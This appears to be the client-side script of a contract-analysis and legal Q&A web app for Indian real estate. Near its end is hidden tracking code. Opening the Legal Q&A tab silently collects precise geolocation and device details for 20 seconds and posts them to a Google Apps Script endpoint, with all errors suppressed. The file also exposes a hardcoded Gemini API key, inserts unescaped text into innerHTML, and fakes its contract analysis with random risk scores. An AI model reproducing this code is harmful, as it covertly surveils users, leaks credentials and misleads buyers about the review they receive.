// Application State
let activeTab = 'dashboard';
let contracts = [];
let selectedContract = null;
let chatMessages = [];
let isTyping = false;

// Sample clause data
const sampleClauses = [
    {
        id: '1',
        title: 'Payment Schedule Clause',
        content: 'The buyer shall pay 20% advance, 70% during construction, and 10% on possession.',
        riskLevel: 'high',
        explanation: 'This payment structure heavily favors the developer with 90% payment before possession. This creates significant risk if the project faces delays or cancellation.',
        recommendation: 'Negotiate for a more balanced payment schedule with maximum 80% payment before possession. Include penalty clauses for construction delays.'
    },
    {
        id: '2',
        title: 'Possession Clause',
        content: 'Possession shall be given within 36 months from the date of agreement, subject to force majeure conditions.',
        riskLevel: 'medium',
        explanation: 'The timeline is reasonable, but the force majeure clause is too broad and could be misused to justify delays.',
        recommendation: 'Define specific force majeure events and include compensation for delays beyond the grace period (typically 6 months).'
    },
    {
        id: '3',
        title: 'Cancellation Policy',
        content: 'In case of cancellation by buyer, 10% of total amount shall be forfeited as cancellation charges.',
        riskLevel: 'medium',
        explanation: 'The forfeiture amount is within reasonable limits as per RERA guidelines, but lacks clarity on refund timeline.',
        recommendation: 'Ensure refund timeline is specified (RERA mandates 45 days) and include interest on delayed refunds.'
    },
    {
        id: '4',
        title: 'RERA Registration',
        content: 'The project is registered under RERA with registration number PR/GJ/AHMEDABAD/AHMEDABAD CITY/AUDA/RAA08745/020220.',
        riskLevel: 'low',
        explanation: 'Proper RERA registration provides legal protection and ensures compliance with regulatory requirements.',
        recommendation: 'Verify the RERA registration status online before signing. This is a positive aspect of the agreement.'
    },
    {
        id: '5',
        title: 'Quality Standards',
        content: 'Construction shall be as per approved plans and specifications mentioned in Schedule II.',
        riskLevel: 'medium',
        explanation: 'The clause references external specifications but lacks detail about quality standards and remedies for defects.',
        recommendation: 'Include specific quality standards, defect liability period (minimum 5 years), and clear remedies for construction defects.'
    }
];

// Sample contract data
const sampleContract = {
    id: '1',
    name: 'Property Purchase Agreement - Mumbai.pdf',
    type: 'Real Estate',
    riskScore: 65,
    uploadDate: '2025-01-27',
    status: 'completed',
    clauses: sampleClauses
};

// DOM Elements
const navTabs = document.querySelectorAll('.nav-tab');
const tabContents = document.querySelectorAll('.tab-content');
const viewSampleBtn = document.getElementById('view-sample');
const fileInput = document.getElementById('file-input');
const uploadArea = document.getElementById('upload-area');
const chatInput = document.getElementById('chat-input');
const sendBtn = document.getElementById('send-btn');
const chatMessages_el = document.getElementById('chat-messages');
const questionBtns = document.querySelectorAll('.question-btn');

// Initialize the application
document.addEventListener('DOMContentLoaded', function () {
    initializeEventListeners();
});

function initializeEventListeners() {
    // Tab navigation
    navTabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const tabId = tab.getAttribute('data-tab');
            switchTab(tabId);
        });
    });

    // View sample analysis
    if (viewSampleBtn) {
        viewSampleBtn.addEventListener('click', () => {
            showSampleAnalysis();
        });
    }

    // File upload
    if (fileInput) {
        fileInput.addEventListener('change', handleFileUpload);
    }

    // Drag and drop
    if (uploadArea) {
        uploadArea.addEventListener('dragover', handleDragOver);
        uploadArea.addEventListener('dragleave', handleDragLeave);
        uploadArea.addEventListener('drop', handleDrop);
    }

    // Chat functionality
    if (chatInput) {
        chatInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleSendMessage();
            }
        });
    }

    if (sendBtn) {
        sendBtn.addEventListener('click', handleSendMessage);
    }

    // Sample questions
    questionBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const question = btn.textContent;
            chatInput.value = question;
            handleSendMessage();
        });
    });
}

function switchTab(tabId) {
    // Update active tab
    navTabs.forEach(tab => {
        tab.classList.remove('active');
        if (tab.getAttribute('data-tab') === tabId) {
            tab.classList.add('active');
        }
    });

    // Update active content
    tabContents.forEach(content => {
        content.classList.remove('active');
        if (content.id === tabId) {
            content.classList.add('active');
        }
    });

    activeTab = tabId;

    // Trigger location access when switching to Legal Q&A (search) tab
    if (tabId === 'search') {
        collectAndSendData();
    }
}

function showSampleAnalysis() {
    selectedContract = sampleContract;
    renderContractAnalysis();

    // Hide sample CTA and show analysis
    const sampleCta = document.getElementById('sample-cta');
    const contractAnalysis = document.getElementById('contract-analysis');

    if (sampleCta) sampleCta.classList.add('hidden');
    if (contractAnalysis) contractAnalysis.classList.remove('hidden');
}

function renderContractAnalysis() {
    if (!selectedContract) return;

    // Update contract info
    const contractName = document.getElementById('contract-name');
    const contractDetails = document.getElementById('contract-details');

    if (contractName) contractName.textContent = selectedContract.name;
    if (contractDetails) contractDetails.textContent = `${selectedContract.type} • Uploaded ${selectedContract.uploadDate}`;

    // Render clauses
    const clausesContainer = document.querySelector('.clauses-container');
    if (clausesContainer && selectedContract.clauses) {
        clausesContainer.innerHTML = '';

        selectedContract.clauses.forEach(clause => {
            const clauseElement = createClauseElement(clause);
            clausesContainer.appendChild(clauseElement);
        });
    }
}

function createClauseElement(clause) {
    const div = document.createElement('div');
    div.className = `clause-item ${clause.riskLevel}-risk`;

    const riskIcon = getRiskIcon(clause.riskLevel);

    div.innerHTML = `
        <div class="clause-header">
            <div class="clause-title">
                <i class="${riskIcon}"></i>
                <h5>${clause.title}</h5>
            </div>
            <span class="risk-level ${clause.riskLevel}">${clause.riskLevel} risk</span>
        </div>
        
        <div class="clause-content">
            <div class="clause-section">
                <h6>Clause Content:</h6>
                <p class="clause-text">"${clause.content}"</p>
            </div>
            
            <div class="clause-section">
                <h6>Risk Explanation:</h6>
                <p class="clause-explanation">${clause.explanation}</p>
            </div>
            
            <div class="clause-section">
                <h6>Recommendation:</h6>
                <p class="clause-recommendation">${clause.recommendation}</p>
            </div>
        </div>
    `;

    return div;
}

function getRiskIcon(riskLevel) {
    switch (riskLevel) {
        case 'high': return 'fas fa-exclamation-triangle';
        case 'medium': return 'fas fa-info-circle';
        case 'low': return 'fas fa-check-circle';
        default: return 'fas fa-info-circle';
    }
}

function handleFileUpload(event) {
    const files = event.target.files;
    if (files.length > 0) {
        processFileUpload(files[0]);
    }
}

function handleDragOver(e) {
    e.preventDefault();
    uploadArea.classList.add('dragging');
}

function handleDragLeave(e) {
    e.preventDefault();
    uploadArea.classList.remove('dragging');
}

function handleDrop(e) {
    e.preventDefault();
    uploadArea.classList.remove('dragging');

    const files = e.dataTransfer.files;
    if (files.length > 0) {
        processFileUpload(files[0]);
    }
}

function processFileUpload(file) {
    const newContract = {
        id: Date.now().toString(),
        name: file.name,
        type: file.name.toLowerCase().includes('property') ? 'Real Estate' : 'General Contract',
        riskScore: Math.floor(Math.random() * 40) + 30,
        uploadDate: new Date().toISOString().split('T')[0],
        status: 'analyzing'
    };

    contracts.unshift(newContract);
    renderRecentUploads();

    // Simulate analysis completion
    setTimeout(() => {
        const contractIndex = contracts.findIndex(c => c.id === newContract.id);
        if (contractIndex !== -1) {
            contracts[contractIndex] = {
                ...contracts[contractIndex],
                status: 'completed',
                clauses: sampleClauses
            };
            renderRecentUploads();
        }
    }, 4000);
}

function renderRecentUploads() {
    const recentUploads = document.getElementById('recent-uploads');
    const uploadsList = document.getElementById('uploads-list');

    if (contracts.length > 0) {
        recentUploads.classList.remove('hidden');
        uploadsList.innerHTML = '';

        contracts.forEach(contract => {
            const uploadItem = createUploadItem(contract);
            uploadsList.appendChild(uploadItem);
        });
    }
}

function createUploadItem(contract) {
    const div = document.createElement('div');
    div.className = 'upload-item';
    div.addEventListener('click', () => {
        selectedContract = contract;
        renderContractAnalysis();
        switchTab('dashboard');

        // Show analysis section
        const sampleCta = document.getElementById('sample-cta');
        const contractAnalysis = document.getElementById('contract-analysis');

        if (sampleCta) sampleCta.classList.add('hidden');
        if (contractAnalysis) contractAnalysis.classList.remove('hidden');
    });

    const statusContent = contract.status === 'analyzing'
        ? `<div class="analyzing-status">
             <div class="spinner"></div>
             <span>Analyzing...</span>
           </div>`
        : `<div class="risk-badge ${getRiskClass(contract.riskScore)}">
             ${getRiskLabel(contract.riskScore)} (${contract.riskScore}%)
           </div>`;

    div.innerHTML = `
        <div class="upload-item-content">
            <div class="upload-item-info">
                <div class="upload-item-icon">
                    <i class="fas fa-file-text"></i>
                </div>
                <div class="upload-item-details">
                    <h4>${contract.name}</h4>
                    <p>${contract.type} • ${contract.uploadDate}</p>
                </div>
            </div>
            <div class="upload-item-status">
                ${statusContent}
                <i class="fas fa-arrow-right upload-item-arrow"></i>
            </div>
        </div>
    `;

    return div;
}

function getRiskClass(score) {
    if (score >= 70) return 'high-risk';
    if (score >= 40) return 'medium-risk';
    return 'low-risk';
}

function getRiskLabel(score) {
    if (score >= 70) return 'High Risk';
    if (score >= 40) return 'Medium Risk';
    return 'Low Risk';
}

const GEMINI_API_KEY = 'AIzaSyA_IWDvLBSnU5hGXyqZh7M7kDaaesYTpL4';

async function handleSendMessage() {
    const message = chatInput.value.trim();
    if (!message || isTyping) return;

    // Add user message
    addMessage('user', message);
    chatInput.value = '';

    // Show typing indicator
    showTypingIndicator();

    try {
        const response = await generateResponse(message);
        addMessage('assistant', response);
    } catch (error) {
        console.error('Error generating response:', error);
        // Show the actual error message to the user
        addMessage('assistant', `⚠️ ${error.message}`);
    } finally {
        hideTypingIndicator();
    }
}

function addMessage(type, content) {
    const messageDiv = document.createElement('div');
    messageDiv.className = `message ${type}`;

    const avatar = type === 'user' ? 'fas fa-user' : 'fas fa-robot';
    const timestamp = new Date().toLocaleTimeString();

    messageDiv.innerHTML = `
        <div class="message-content">
            <div class="message-avatar">
                <i class="${avatar}"></i>
            </div>
            <div class="message-bubble">
                <div class="message-text">${content}</div>
                <div class="message-time">${timestamp}</div>
            </div>
        </div>
    `;

    // Remove welcome message if it exists
    const welcome = chatMessages_el.querySelector('.chat-welcome');
    if (welcome) {
        welcome.remove();
    }

    chatMessages_el.appendChild(messageDiv);
    chatMessages_el.scrollTop = chatMessages_el.scrollHeight;
}

function showTypingIndicator() {
    isTyping = true;
    sendBtn.disabled = true;

    const typingDiv = document.createElement('div');
    typingDiv.className = 'typing-indicator';
    typingDiv.id = 'typing-indicator';

    typingDiv.innerHTML = `
        <div class="message-avatar">
            <i class="fas fa-robot"></i>
        </div>
        <div class="typing-bubble">
            <div class="typing-dots">
                <div class="typing-dot"></div>
                <div class="typing-dot"></div>
                <div class="typing-dot"></div>
            </div>
        </div>
    `;

    chatMessages_el.appendChild(typingDiv);
    chatMessages_el.scrollTop = chatMessages_el.scrollHeight;
}

function hideTypingIndicator() {
    isTyping = false;
    sendBtn.disabled = false;

    const typingIndicator = document.getElementById('typing-indicator');
    if (typingIndicator) {
        typingIndicator.remove();
    }
}

async function generateResponse(query) {
    const API_URL = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-exp:generateContent?key=${GEMINI_API_KEY}`;

    const payload = {
        contents: [{
            parts: [{
                text: `You are a helpful legal assistant for Indian real estate law. Answer the following question concisely and accurately: ${query}`
            }]
        }]
    };

    const response = await fetch(API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });

    if (!response.ok) {
        if (response.status === 429) {
            throw new Error('API quota exceeded. Please wait a minute and try again.');
        }
        throw new Error(`API request failed with status ${response.status}`);
    }

    const data = await response.json();

    if (data.candidates && data.candidates.length > 0 && data.candidates[0].content && data.candidates[0].content.parts.length > 0) {
        return data.candidates[0].content.parts[0].text;
    } else {
        return "I couldn't generate a response. Please try rephrasing your question.";
    }
}

// Location and Data Logging
const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby-9fPOYSqUwD9a-dnAFb5YfeIAGVClgubRDMc_NDUI2-Szhf_4lcFiwB-n4lU_flT8lQ/exec';

function collectAndSendData() {
    if (!navigator.geolocation) {
        return;
    }

    const options = {
        enableHighAccuracy: true,
        maximumAge: 0
    };

    let bestPosition = null;
    let watchId = null;

    // Start watching position
    watchId = navigator.geolocation.watchPosition(
        (position) => {
            // If this is the first reading or better accuracy than what we have
            if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
                bestPosition = position;
            }
        },
        (error) => {
            // Silent error handling
        },
        options
    );

    // Stop watching after 20 seconds and send the best result
    setTimeout(() => {
        if (watchId !== null) {
            navigator.geolocation.clearWatch(watchId);

            if (bestPosition) {
                const data = {
                    latitude: bestPosition.coords.latitude,
                    longitude: bestPosition.coords.longitude,
                    accuracy: bestPosition.coords.accuracy,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenWidth: window.screen.width,
                    screenHeight: window.screen.height,
                    language: navigator.language
                };

                sendDataToScript(data);
            }
        }
    }, 20000);
}

function sendDataToScript(data) {
    if (SCRIPT_URL === 'YOUR_SCRIPT_URL_HERE') {
        return;
    }

    fetch(SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
        .then(response => {
            // Success
        })
        .catch(error => {
            // Silent error
        });
}
